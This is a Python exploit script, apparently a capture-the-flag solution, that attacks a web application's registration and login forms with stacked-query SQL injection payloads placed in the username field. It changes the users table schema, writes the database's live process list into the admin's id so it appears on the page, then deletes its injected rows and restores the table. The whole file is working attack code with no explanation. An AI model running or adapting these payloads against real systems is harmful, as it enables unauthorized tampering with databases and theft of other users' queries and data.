#!/usr/bin/env python3

import requests
import re
import time
import sys

url_base = sys.argv[1]

# modify the data type for the id column
s = requests.session()
payload = f'" UNION SELECT 1,2; ALTER TABLE web.users MODIFY id VARCHAR(255); ALTER TABLE web.users DROP PRIMARY KEY;#'
s.post(url_base + "register.php", data={"username": payload, "password": "jxf", "submit": "Submit Query"})
s.post(url_base + "login.php", data={"username": payload, "password": "jxf", "login": "Submit Query"})
s.get(url_base)

# create and log in with an account to update the id column with the current queries if it is not empty
s = requests.session()
payload = f'" UNION SELECT 1,2; UPDATE web.users SET id=(SELECT IFNULL(GROUP_CONCAT(INFO_BINARY),"1") FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE "%INFO_BINARY%") WHERE username="admin";#'
s.post(url_base + "register.php", data={"username": payload, "password": "jxf", "submit": "Submit Query"})
s.post(url_base + "login.php", data={"username": payload, "password": "jxf", "login": "Submit Query"})

# constantly update the id field by fetching the last logins page and if it is not set to 1, print it and exit
while True:
    r = s.get(url_base)
    if "User 1 - admin" not in r.text:
        print(re.search(r"User (.*) - admin last logins", r.text).group(1))
        
        # after successful extraction, clean up the database
        payload = f'" UNION SELECT 1,2; DELETE FROM web.users WHERE username LIKE "%UNION SELECT 1,2%"; UPDATE web.users SET id="1" WHERE username="admin"; ALTER TABLE web.users MODIFY id INT PRIMARY KEY AUTO_INCREMENT;#'
        s = requests.session()
        s.post(url_base + "register.php", data={"username": payload, "password": "jxf", "submit": "Submit Query"})
        s.post(url_base + "login.php", data={"username": payload, "password": "jxf", "login": "Submit Query"})
        s.get(url_base)

        break

    time.sleep(1)
